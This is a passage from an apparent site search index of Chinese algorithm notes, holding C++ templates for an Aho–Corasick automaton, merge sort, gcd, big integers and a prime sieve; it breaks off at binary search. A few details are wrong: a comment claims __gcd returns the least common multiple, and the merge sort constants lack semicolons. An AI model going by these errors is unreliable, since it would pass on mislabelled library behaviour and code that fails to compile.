\u5c06fail\u6570\u7ec4\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c fail[trie[pos][i]] = trie[fail[pos]][i]; // \u8f93\u51fa\u6784\u5efafail\u6570\u7ec4\u7684\u8fc7\u7a0b // cout << \"True char: \" << (char)('a' + i) << \" fail: \" << trie[fail[pos]][i] << endl; // \u5143\u7d20\u5165\u961f q.push(trie[pos][i]); } else { // \u82e5\u4e0d\u5b58\u5728\uff0c\u5c06trie\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c // \u65b9\u4fbf\u4e0b\u6b21\u8ba1\u7b97 trie[pos][i] = trie[fail[pos]][i]; } } } } // \u67e5\u8be2 int query(char* str) { int len = strlen(str); int pos = 0, ans = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; pos = trie[pos][c]; for (int j = pos; j && vis[j] != -1; j = fail[j]) { ans += vis[j]; vis[j] = -1; } } return ans; } }; 2. \u9898\u76ee # AC\u81ea\u52a8\u673a\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"3.AC\u81ea\u52a8\u673a"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.AC%E8%87%AA%E5%8A%A8%E6%9C%BA/#ac","text":"","title":"AC\u81ea\u52a8\u673a"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.AC%E8%87%AA%E5%8A%A8%E6%9C%BA/#_1","text":"AC\u81ea\u52a8\u673a \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.AC%E8%87%AA%E5%8A%A8%E6%9C%BA/#1","text":"#include <iostream> #include <queue> #include <string.h> using namespace std; const int maxN = 5e5 + 1; // \u6a21\u5f0f\u4e32\u957f\u5ea6 * \u6a21\u5f0f\u4e32\u6570\u91cf const int maxM = 1e6 + 1; // \u76ee\u6807\u4e32\u957f\u5ea6 const int chSize = 26; // \u5b57\u7b26\u96c6\u5927\u5c0f class AcAutomaton { public: int trie[maxN][chSize]; int vis[maxN], fail[maxN]; int tot; // \u521d\u59cb\u5316 void init() { memset(vis, 0, sizeof vis); memset(trie, 0, sizeof trie); tot = 0; } // \u63d2\u5165 void insert(char* str) { int len = strlen(str); int pos = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; if (!trie[pos][c]) trie[pos][c] = ++tot; pos = trie[pos][c]; } vis[pos]++; } // DFS\u83b7\u53d6Fail\u6570\u7ec4 void build() { queue<int> q; // \u6839\u7ed3\u70b9\u4e0b\u7684\u5143\u7d20\u5165\u961f for (int i = 0; i < chSize; i++) { if (trie[0][i]) { fail[trie[0][i]] = 0; q.push(trie[0][i]); } } // DFS while (!q.empty()) { // \u83b7\u53d6\u961f\u9996\u5143\u7d20 int pos = q.front(); // \u8f93\u51fa\u961f\u9996\u5143\u7d20 // cout << \"front: \" << pos << endl; // \u961f\u9996\u51fa\u961f q.pop(); // \u904d\u5386\u961f\u9996\u5143\u7d20\u7684\u5b50\u8282\u70b9 for (int i = 0; i < chSize; i++) { // \u82e5\u5143\u7d20ch\u5b58\u5728 if (trie[pos][i]) { // \u5c06fail\u6570\u7ec4\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c fail[trie[pos][i]] = trie[fail[pos]][i]; // \u8f93\u51fa\u6784\u5efafail\u6570\u7ec4\u7684\u8fc7\u7a0b // cout << \"True char: \" << (char)('a' + i) << \" fail: \" << trie[fail[pos]][i] << endl; // \u5143\u7d20\u5165\u961f q.push(trie[pos][i]); } else { // \u82e5\u4e0d\u5b58\u5728\uff0c\u5c06trie\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c // \u65b9\u4fbf\u4e0b\u6b21\u8ba1\u7b97 trie[pos][i] = trie[fail[pos]][i]; } } } } // \u67e5\u8be2 int query(char* str) { int len = strlen(str); int pos = 0, ans = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; pos = trie[pos][c]; for (int j = pos; j && vis[j] != -1; j = fail[j]) { ans += vis[j]; vis[j] = -1; } } return ans; } };","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.AC%E8%87%AA%E5%8A%A8%E6%9C%BA/#2","text":"AC\u81ea\u52a8\u673a\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"2. \u9898\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%8E%92%E5%BA%8F/1.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/","text":"\u5f52\u5e76\u6392\u5e8f # \u76ee\u5f55 # \u5f52\u5e76\u6392\u5e8f \u76ee\u5f55 #include<iostream> #include<string.h> const int MAXN = 1e5 + 1 const int MAXM = 1e9 + 1 int list[MAXN]; int leftArray[MAXN]; int rightArray[MAXN]; //\u5f52\u5e76array[p\u2026q]\u4e0earray[q+1\u2026r] int merge(int* array, int start, int mid, int end) { // \u8bb0\u5f55\u9006\u5e8f\u6570\u91cf int inversePairNum = 0; // \u5de6\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n1 = mid - start + 1; // \u53f3\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n2 = end - mid; int i, j; // \u521d\u59cb\u5316\u6570\u7ec4 memset(leftArray, 0, n1 * sizeof(int)); memset(rightArray, 0, n2 * sizeof(int)); // \u6570\u7ec4\u8d4b\u503c for (i = 0; i < n1; i++) leftArray[i] = array[start + i]; for (j = 0; j < n2; j++) rightArray[j] = array[mid + 1 + j]; leftArray[n1] = rightArray[n2] = MAXM; //\u907f\u514d\u68c0\u67e5\u6bcf\u4e00\u90e8\u5206\u662f\u5426\u4e3a\u7a7a // \u6e05\u96f6 i = j = 0; // \u5f52\u5e76 for (int k = start; k <= end; k++) { if (leftArray[i] <= rightArray[j]) { array[k] = leftArray[i]; i++; } else { array[k] = rightArray[j]; j++; // \u82e5\u6709\u6570\u5b57\u4ece\u53f3\u5f80\u5de6\u79fb\u52a8\uff0c\u8bb0\u5f55\u5176\u79fb\u52a8\u8ddd\u79bb inversePairNum += n1 - i; } } // \u8fd4\u56de\u9006\u5e8f\u6570 return inversePairNum; } int mergeSort(int* array, int start, int end) { int sum = 0; if (start < end) { int mid = (start + end) / 2; sum += mergeSort(array, start, mid); sum += mergeSort(array, mid + 1, end); sum += merge(array, start, mid, end); } return sum; }","title":"1.\u5f52\u5e76\u6392\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%8E%92%E5%BA%8F/1.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#_1","text":"","title":"\u5f52\u5e76\u6392\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%8E%92%E5%BA%8F/1.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#_2","text":"\u5f52\u5e76\u6392\u5e8f \u76ee\u5f55 #include<iostream> #include<string.h> const int MAXN = 1e5 + 1 const int MAXM = 1e9 + 1 int list[MAXN]; int leftArray[MAXN]; int rightArray[MAXN]; //\u5f52\u5e76array[p\u2026q]\u4e0earray[q+1\u2026r] int merge(int* array, int start, int mid, int end) { // \u8bb0\u5f55\u9006\u5e8f\u6570\u91cf int inversePairNum = 0; // \u5de6\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n1 = mid - start + 1; // \u53f3\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n2 = end - mid; int i, j; // \u521d\u59cb\u5316\u6570\u7ec4 memset(leftArray, 0, n1 * sizeof(int)); memset(rightArray, 0, n2 * sizeof(int)); // \u6570\u7ec4\u8d4b\u503c for (i = 0; i < n1; i++) leftArray[i] = array[start + i]; for (j = 0; j < n2; j++) rightArray[j] = array[mid + 1 + j]; leftArray[n1] = rightArray[n2] = MAXM; //\u907f\u514d\u68c0\u67e5\u6bcf\u4e00\u90e8\u5206\u662f\u5426\u4e3a\u7a7a // \u6e05\u96f6 i = j = 0; // \u5f52\u5e76 for (int k = start; k <= end; k++) { if (leftArray[i] <= rightArray[j]) { array[k] = leftArray[i]; i++; } else { array[k] = rightArray[j]; j++; // \u82e5\u6709\u6570\u5b57\u4ece\u53f3\u5f80\u5de6\u79fb\u52a8\uff0c\u8bb0\u5f55\u5176\u79fb\u52a8\u8ddd\u79bb inversePairNum += n1 - i; } } // \u8fd4\u56de\u9006\u5e8f\u6570 return inversePairNum; } int mergeSort(int* array, int start, int end) { int sum = 0; if (start < end) { int mid = (start + end) / 2; sum += mergeSort(array, start, mid); sum += mergeSort(array, mid + 1, end); sum += merge(array, start, mid, end); } return sum; }","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/1.%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/","text":"\u8f93\u5165\u8f93\u51fa # \u76ee\u5f55 # \u8f93\u5165\u8f93\u51fa \u76ee\u5f55 1. \u6a21\u677f 2. STL 3. \u9898\u76ee 1. \u6a21\u677f # long long gcd(long long a, long long b) { return b == 0 ? a : gcd(b, a % b); } 2. STL # // \u8fd4\u56de x \u548c y \u7684\u6700\u5c0f\u516c\u500d\u6570 __gcd(x, y); 3. \u9898\u76ee # \u6570\u5b66\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"1.\u6700\u5927\u516c\u7ea6\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/1.%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/#_1","text":"","title":"\u8f93\u5165\u8f93\u51fa"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/1.%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/#_2","text":"\u8f93\u5165\u8f93\u51fa \u76ee\u5f55 1. \u6a21\u677f 2. STL 3. \u9898\u76ee","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/1.%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/#1","text":"long long gcd(long long a, long long b) { return b == 0 ? a : gcd(b, a % b); }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/1.%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/#2-stl","text":"// \u8fd4\u56de x \u548c y \u7684\u6700\u5c0f\u516c\u500d\u6570 __gcd(x, y);","title":"2. STL"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/1.%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/#3","text":"\u6570\u5b66\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"3. \u9898\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/2.%E9%AB%98%E7%B2%BE%E5%BA%A6/","text":"\u9ad8\u7cbe\u5ea6 # \u76ee\u5f55 # \u9ad8\u7cbe\u5ea6 \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee 1. \u6a21\u677f # #include <algorithm> #include <iostream> #include <vector> using namespace std; struct Wint : vector<int> //\u7528\u6807\u51c6\u5e93vector\u505a\u57fa\u7c7b\uff0c\u5b8c\u7f8e\u89e3\u51b3\u4f4d\u6570\u95ee\u9898\uff0c\u540c\u65f6\u66f4\u6613\u4e8e\u5b9e\u73b0 { //\u5c06\u4f4e\u7cbe\u5ea6\u8f6c\u9ad8\u7cbe\u5ea6\u7684\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u81ea\u52a8\u88ab\u7f16\u8bd1\u5668\u8c03\u7528 //\u56e0\u6b64\u65e0\u9700\u5355\u72ec\u5199\u9ad8\u7cbe\u5ea6\u6570\u548c\u4f4e\u7cbe\u5ea6\u6570\u7684\u8fd0\u7b97\u51fd\u6570\uff0c\u5341\u5206\u65b9\u4fbf Wint(int n = 0) //\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a0\uff0c\u4f460\u7684\u4fdd\u5b58\u5f62\u5f0f\u4e3a\u7a7a { push_back(n); check(); } Wint& check() //\u5728\u5404\u7c7b\u8fd0\u7b97\u4e2d\u7ecf\u5e38\u7528\u5230\u7684\u8fdb\u4f4d\u5c0f\u51fd\u6570\uff0c\u4e0d\u59a8\u5185\u7f6e { while (!empty() && !back()) pop_back(); //\u53bb\u9664\u6700\u9ad8\u4f4d\u53ef\u80fd\u5b58\u5728\u76840 if (empty()) return *this; for (size_t i = 1; i < size(); ++i) //\u5904\u7406\u8fdb\u4f4d { (*this)[i] += (*this)[i - 1] / 10; (*this)[i - 1] %= 10; } while (back() >= 10) { push_back(back() / 10); (*this)[size() - 2] %= 10; } return *this; //\u4e3a\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c06\u8fdb\u4f4d\u540e\u7684\u81ea\u8eab\u8fd4\u56de\u5f15\u7528 } }; //\u8f93\u5165\u8f93\u51fa istream& operator>>(istream& is, Wint& n) { string s; is >> s; n.clear(); for (int i = s.size() - 1; i >= 0; --i) n.push_back(s[i] - '0'); return is; } ostream& operator<<(ostream& os, const Wint& n) { if (n.empty()) os << 0; for (int i = n.size() - 1; i >= 0; --i) os << n[i]; return os; } //\u6bd4\u8f83\uff0c\u53ea\u9700\u8981\u5199\u4e24\u4e2a\uff0c\u5176\u4ed6\u7684\u76f4\u63a5\u4ee3\u5165\u5373\u53ef //\u5e38\u91cf\u5f15\u7528\u5f53\u53c2\u6570\uff0c\u907f\u514d\u62f7\u8d1d\u66f4\u9ad8\u6548 bool operator!=(const Wint& a, const Wint& b) { if (a.size() != b.size()) return 1; for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return 1; return 0; } bool operator==(const Wint& a, const Wint& b) { return !(a != b); } bool operator<(const Wint& a, const Wint& b) { if (a.size() != b.size()) return a.size() < b.size(); for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return a[i] < b[i]; return 0; } bool operator>(const Wint& a, const Wint& b) { return b < a; } bool operator<=(const Wint& a, const Wint& b) { return !(a > b); } bool operator>=(const Wint& a, const Wint& b) { return !(a < b); } //\u52a0\u6cd5\uff0c\u5148\u5b9e\u73b0+=\uff0c\u8fd9\u6837\u66f4\u7b80\u6d01\u9ad8\u6548 Wint& operator+=(Wint& a, const Wint& b) { if (a.size() < b.size()) a.resize(b.size()); for (size_t i = 0; i != b.size(); ++i) a[i] += b[i]; return a.check(); } Wint operator+(Wint a, const Wint& b) { return a += b; } //\u51cf\u6cd5\uff0c\u8fd4\u56de\u5dee\u7684\u7edd\u5bf9\u503c\uff0c\u7531\u4e8e\u540e\u9762\u6709\u4ea4\u6362\uff0c\u6545\u53c2\u6570\u4e0d\u7528\u5f15\u7528 Wint& operator-=(Wint& a, Wint b) { if (a < b) swap(a, b); for (size_t i = 0; i != b.size(); a[i] -= b[i], ++i) if (a[i] < b[i]) //\u9700\u8981\u501f\u4f4d { size_t j = i + 1; while (!a[j]) ++j; while (j > i) { --a[j]; a[--j] += 10; } } return a.check(); } Wint operator-(Wint a, const Wint& b) { return a -= b; } //\u4e58\u6cd5\u4e0d\u80fd\u5148\u5b9e\u73b0*=\uff0c\u539f\u56e0\u81ea\u5df1\u60f3 Wint operator*(const Wint& a, const Wint& b) { Wint n; n.assign(a.size() + b.size() - 1, 0); for (size_t i = 0; i != a.size(); ++i) for (size_t j = 0; j != b.size(); ++j) n[i + j] += a[i] * b[j]; return n.check(); } Wint& operator*=(Wint& a, const Wint& b) { return a = a * b; } //\u9664\u6cd5\u548c\u53d6\u6a21\u5148\u5b9e\u73b0\u4e00\u4e2a\u5e26\u4f59\u9664\u6cd5\u51fd\u6570 Wint divmod(Wint& a, const Wint& b) { Wint ans; for (int t = a.size() - b.size(); a >= b; --t) { Wint d; d.assign(t + 1, 0); d.back() = 1; Wint c = b * d; while (a >= c) { a -= c; ans += d; } } return ans; } Wint operator/(Wint a, const Wint& b) { return divmod(a, b); } Wint& operator/=(Wint& a, const Wint& b) { return a = a / b; } Wint& operator%=(Wint& a, const Wint& b) { divmod(a, b); return a; } Wint operator%(Wint a, const Wint& b) { return a %= b; } //\u987a\u624b\u5b9e\u73b0\u4e00\u4e2a\u5feb\u901f\u5e42\uff0c\u53ef\u4ee5\u770b\u5230\u548c\u666e\u901a\u5feb\u901f\u5e42\u51e0\u4e4e\u65e0\u5f02 Wint pow(const Wint& n, const Wint& k) { if (k.empty()) return 1; if (k == 2) return n * n; if (k.back() % 2) return n * pow(n, k - 1); return pow(pow(n, k / 2), 2); } 2. \u9898\u76ee # \u9ad8\u7cbe\u5ea6\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"2.\u9ad8\u7cbe\u5ea6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/2.%E9%AB%98%E7%B2%BE%E5%BA%A6/#_1","text":"","title":"\u9ad8\u7cbe\u5ea6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/2.%E9%AB%98%E7%B2%BE%E5%BA%A6/#_2","text":"\u9ad8\u7cbe\u5ea6 \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/2.%E9%AB%98%E7%B2%BE%E5%BA%A6/#1","text":"#include <algorithm> #include <iostream> #include <vector> using namespace std; struct Wint : vector<int> //\u7528\u6807\u51c6\u5e93vector\u505a\u57fa\u7c7b\uff0c\u5b8c\u7f8e\u89e3\u51b3\u4f4d\u6570\u95ee\u9898\uff0c\u540c\u65f6\u66f4\u6613\u4e8e\u5b9e\u73b0 { //\u5c06\u4f4e\u7cbe\u5ea6\u8f6c\u9ad8\u7cbe\u5ea6\u7684\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u81ea\u52a8\u88ab\u7f16\u8bd1\u5668\u8c03\u7528 //\u56e0\u6b64\u65e0\u9700\u5355\u72ec\u5199\u9ad8\u7cbe\u5ea6\u6570\u548c\u4f4e\u7cbe\u5ea6\u6570\u7684\u8fd0\u7b97\u51fd\u6570\uff0c\u5341\u5206\u65b9\u4fbf Wint(int n = 0) //\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a0\uff0c\u4f460\u7684\u4fdd\u5b58\u5f62\u5f0f\u4e3a\u7a7a { push_back(n); check(); } Wint& check() //\u5728\u5404\u7c7b\u8fd0\u7b97\u4e2d\u7ecf\u5e38\u7528\u5230\u7684\u8fdb\u4f4d\u5c0f\u51fd\u6570\uff0c\u4e0d\u59a8\u5185\u7f6e { while (!empty() && !back()) pop_back(); //\u53bb\u9664\u6700\u9ad8\u4f4d\u53ef\u80fd\u5b58\u5728\u76840 if (empty()) return *this; for (size_t i = 1; i < size(); ++i) //\u5904\u7406\u8fdb\u4f4d { (*this)[i] += (*this)[i - 1] / 10; (*this)[i - 1] %= 10; } while (back() >= 10) { push_back(back() / 10); (*this)[size() - 2] %= 10; } return *this; //\u4e3a\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c06\u8fdb\u4f4d\u540e\u7684\u81ea\u8eab\u8fd4\u56de\u5f15\u7528 } }; //\u8f93\u5165\u8f93\u51fa istream& operator>>(istream& is, Wint& n) { string s; is >> s; n.clear(); for (int i = s.size() - 1; i >= 0; --i) n.push_back(s[i] - '0'); return is; } ostream& operator<<(ostream& os, const Wint& n) { if (n.empty()) os << 0; for (int i = n.size() - 1; i >= 0; --i) os << n[i]; return os; } //\u6bd4\u8f83\uff0c\u53ea\u9700\u8981\u5199\u4e24\u4e2a\uff0c\u5176\u4ed6\u7684\u76f4\u63a5\u4ee3\u5165\u5373\u53ef //\u5e38\u91cf\u5f15\u7528\u5f53\u53c2\u6570\uff0c\u907f\u514d\u62f7\u8d1d\u66f4\u9ad8\u6548 bool operator!=(const Wint& a, const Wint& b) { if (a.size() != b.size()) return 1; for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return 1; return 0; } bool operator==(const Wint& a, const Wint& b) { return !(a != b); } bool operator<(const Wint& a, const Wint& b) { if (a.size() != b.size()) return a.size() < b.size(); for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return a[i] < b[i]; return 0; } bool operator>(const Wint& a, const Wint& b) { return b < a; } bool operator<=(const Wint& a, const Wint& b) { return !(a > b); } bool operator>=(const Wint& a, const Wint& b) { return !(a < b); } //\u52a0\u6cd5\uff0c\u5148\u5b9e\u73b0+=\uff0c\u8fd9\u6837\u66f4\u7b80\u6d01\u9ad8\u6548 Wint& operator+=(Wint& a, const Wint& b) { if (a.size() < b.size()) a.resize(b.size()); for (size_t i = 0; i != b.size(); ++i) a[i] += b[i]; return a.check(); } Wint operator+(Wint a, const Wint& b) { return a += b; } //\u51cf\u6cd5\uff0c\u8fd4\u56de\u5dee\u7684\u7edd\u5bf9\u503c\uff0c\u7531\u4e8e\u540e\u9762\u6709\u4ea4\u6362\uff0c\u6545\u53c2\u6570\u4e0d\u7528\u5f15\u7528 Wint& operator-=(Wint& a, Wint b) { if (a < b) swap(a, b); for (size_t i = 0; i != b.size(); a[i] -= b[i], ++i) if (a[i] < b[i]) //\u9700\u8981\u501f\u4f4d { size_t j = i + 1; while (!a[j]) ++j; while (j > i) { --a[j]; a[--j] += 10; } } return a.check(); } Wint operator-(Wint a, const Wint& b) { return a -= b; } //\u4e58\u6cd5\u4e0d\u80fd\u5148\u5b9e\u73b0*=\uff0c\u539f\u56e0\u81ea\u5df1\u60f3 Wint operator*(const Wint& a, const Wint& b) { Wint n; n.assign(a.size() + b.size() - 1, 0); for (size_t i = 0; i != a.size(); ++i) for (size_t j = 0; j != b.size(); ++j) n[i + j] += a[i] * b[j]; return n.check(); } Wint& operator*=(Wint& a, const Wint& b) { return a = a * b; } //\u9664\u6cd5\u548c\u53d6\u6a21\u5148\u5b9e\u73b0\u4e00\u4e2a\u5e26\u4f59\u9664\u6cd5\u51fd\u6570 Wint divmod(Wint& a, const Wint& b) { Wint ans; for (int t = a.size() - b.size(); a >= b; --t) { Wint d; d.assign(t + 1, 0); d.back() = 1; Wint c = b * d; while (a >= c) { a -= c; ans += d; } } return ans; } Wint operator/(Wint a, const Wint& b) { return divmod(a, b); } Wint& operator/=(Wint& a, const Wint& b) { return a = a / b; } Wint& operator%=(Wint& a, const Wint& b) { divmod(a, b); return a; } Wint operator%(Wint a, const Wint& b) { return a %= b; } //\u987a\u624b\u5b9e\u73b0\u4e00\u4e2a\u5feb\u901f\u5e42\uff0c\u53ef\u4ee5\u770b\u5230\u548c\u666e\u901a\u5feb\u901f\u5e42\u51e0\u4e4e\u65e0\u5f02 Wint pow(const Wint& n, const Wint& k) { if (k.empty()) return 1; if (k == 2) return n * n; if (k.back() % 2) return n * pow(n, k - 1); return pow(pow(n, k / 2), 2); }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/2.%E9%AB%98%E7%B2%BE%E5%BA%A6/#2","text":"\u9ad8\u7cbe\u5ea6\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"2. \u9898\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/3.%E5%9F%83%E6%B0%8F%E7%AD%9B/","text":"\u57c3\u6c0f\u7b5b # \u76ee\u5f55 # \u57c3\u6c0f\u7b5b \u76ee\u5f55 1. \u6a21\u677f 1. \u6a21\u677f # #include <iostream> using namespace std; const int MAXN = 1e6 + 1; int prime[MAXN]; bool visit[MAXN] = {0}; // \u8ba1\u7b97[2, n]\u5185\u7684\u7d20\u6570 int E_sieve(int n) { // \u7b5b\u6389\u975e\u7d20\u6570 for (int i = 2; i * i <= n; i++) { if (!visit[i]) { // \u6807\u8bb0\u975e\u7d20\u6570 for (int j = i * i; j <= n; j += i) { visit[j] = true; } } } // \u7edf\u8ba1\u7d20\u6570\u7684\u4e2a\u6570 int k = 0; for (int i = 2; i <= n; i++) { if (!visit[i]) { prime[k++] = i; } } return k; } \u590d\u6742\u5ea6 O(n \\log \\log_2(n))","title":"3.\u57c3\u6c0f\u7b5b"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/3.%E5%9F%83%E6%B0%8F%E7%AD%9B/#_1","text":"","title":"\u57c3\u6c0f\u7b5b"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/3.%E5%9F%83%E6%B0%8F%E7%AD%9B/#_2","text":"\u57c3\u6c0f\u7b5b \u76ee\u5f55 1. \u6a21\u677f","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%95%B0%E5%AD%A6/3.%E5%9F%83%E6%B0%8F%E7%AD%9B/#1","text":"#include <iostream> using namespace std; const int MAXN = 1e6 + 1; int prime[MAXN]; bool visit[MAXN] = {0}; // \u8ba1\u7b97[2, n]\u5185\u7684\u7d20\u6570 int E_sieve(int n) { // \u7b5b\u6389\u975e\u7d20\u6570 for (int i = 2; i * i <= n; i++) { if (!visit[i]) { // \u6807\u8bb0\u975e\u7d20\u6570 for (int j = i * i; j <= n; j += i) { visit[j] = true; } } } // \u7edf\u8ba1\u7d20\u6570\u7684\u4e2a\u6570 int k = 0; for (int i = 2; i <= n; i++) { if (!visit[i]) { prime[k++] = i; } } return k; } \u590d\u6742\u5ea6 O(n \\log \\log_2(n))","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E6%9F%A5%E6%89%BE/1.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/","text":"\u4e8c\u5206\u67e5\u627e # \u76ee\u5f55 # \u4e8c\u5206\u67e5\u627e \u76ee\u5f55 1. \u6a21\u677f 2. STL 3. \u9898\u76ee 1. \u6a21\u677f # int binary_search(int array[],int low,int high,int target) { while(low<=high) { int 